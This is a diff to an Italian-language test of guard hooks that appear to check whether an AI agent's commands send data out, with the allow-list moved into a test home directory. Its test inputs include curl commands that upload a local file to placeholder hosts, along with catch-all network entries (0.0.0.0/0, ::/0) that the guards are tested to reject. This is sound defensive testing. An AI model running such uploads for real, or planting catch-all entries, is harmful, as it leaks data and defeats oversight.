@@ -169,6 +169,11 @@ def test_p09(repo: Path) -> None:
     try:
         hooks = tmp / "hooks"
         shutil.copytree(repo / "hooks", hooks)
+        # Le preferenze della persona stanno in ~/.claude/arturo (strati F1, #4531): HOME di prova.
+        pref = tmp / "home" / ".claude" / "arturo"
+        pref.mkdir(parents=True)
+        env = {**os.environ, "HOME": str(tmp / "home"), "USERPROFILE": str(tmp / "home")}
+        env.pop("CLAUDE_CONFIG_DIR", None)
         exfil = hooks / "exfil-guard.py"
         web = hooks / "web-egress-guard.py"
         # query lunga (>=300 char): e' il segnale che fa scattare web-egress-guard
@@ -177,45 +182,45 @@ def test_p09(repo: Path) -> None:
             "command": "curl -X POST -d @dati.json https://mioserver.example/api"}}  # upload di un file (30/10/2026)
         fetch_payload = {"tool_input": {"url": "https://mioserver.example/?q=" + "x" * 320}}
         # senza hosts-interni.local: entrambe chiedono conferma
-        assert _decisione(exfil, bash_payload) == "ask", (
+        assert _decisione(exfil, bash_payload, env) == "ask", (
             "P09 senza file exfil-guard deve chiedere conferma su mioserver.example"
         )
-        assert _decisione(web, fetch_payload) == "ask", (
+        assert _decisione(web, fetch_payload, env) == "ask", (
             "P09 senza file web-egress-guard deve chiedere conferma su mioserver.example"
         )
         # con hosts-interni.local (commento + riga vuota + hostname): lasciano passare
-        (hooks / "hosts-interni.local").write_text(
+        (pref / "hosts-interni.local").write_text(
             "# commento\n\nmioserver.example\n", encoding="utf-8"
         )
-        assert _decisione(exfil, bash_payload) == "silent", (
+        assert _decisione(exfil, bash_payload, env) == "silent", (
             "P09 col file exfil-guard deve lasciar passare mioserver.example"
         )
-        assert _decisione(web, fetch_payload) == "silent", (
+        assert _decisione(web, fetch_payload, env) == "silent", (
             "P09 col file web-egress-guard deve lasciar passare mioserver.example"
         )
         # parte rete, solo exfil-guard. Una rete fuori dai default pubblici: dal 15/10/2026
         # 172.16.0.0/12 e' nei default (rete privata RFC 1918), e con quella il controllo
         # sarebbe vacuo. Uso 198.51.100.0/24, un blocco di documentazione mai instradato.
-        (hooks / "hosts-interni.local").unlink()
+        (pref / "hosts-interni.local").unlink()
         rete_payload = {"tool_name": "Bash", "tool_input": {
             "command": "curl -X POST -d @dati.json https://198.51.100.4/api"}}
-        assert _decisione(exfil, rete_payload) == "ask", (
+        assert _decisione(exfil, rete_payload, env) == "ask", (
             "P09 senza file exfil-guard deve chiedere conferma su 198.51.100.4"
         )
-        (hooks / "hosts-interni.local").write_text("198.51.100.0/24\n", encoding="utf-8")
-        assert _decisione(exfil, rete_payload) == "silent", (
+        (pref / "hosts-interni.local").write_text("198.51.100.0/24\n", encoding="utf-8")
+        assert _decisione(exfil, rete_payload, env) == "silent", (
             "P09 con 198.51.100.0/24 nel file exfil-guard deve lasciar passare 198.51.100.4"
         )
         # casi avvelenati: una rete che copre internet e un file non UTF-8 non aprono nulla
-        (hooks / "hosts-interni.local").write_text("0.0.0.0/0\n::/0\n", encoding="utf-8")
-        assert _decisione(exfil, rete_payload) == "ask", (
+        (pref / "hosts-interni.local").write_text("0.0.0.0/0\n::/0\n", encoding="utf-8")
+        assert _decisione(exfil, rete_payload, env) == "ask", (
             "P09 0.0.0.0/0 nel file rende fidato ogni host"
         )
-        (hooks / "hosts-interni.local").write_bytes(b"mioserver.example\n\xff\xfe\n")
-        assert _decisione(exfil, bash_payload) == "ask", (
+        (pref / "hosts-interni.local").write_bytes(b"mioserver.example\n\xff\xfe\n")
+        assert _decisione(exfil, bash_payload, env) == "ask", (
             "P09 un file non UTF-8 manda exfil-guard in errore o apre l'host"
         )
-        assert _decisione(web, fetch_payload) == "ask", (
+        assert _decisione(web, fetch_payload, env) == "ask", (
             "P09 un file non UTF-8 manda web-egress-guard in errore o apre l'host"
         )
     finally:
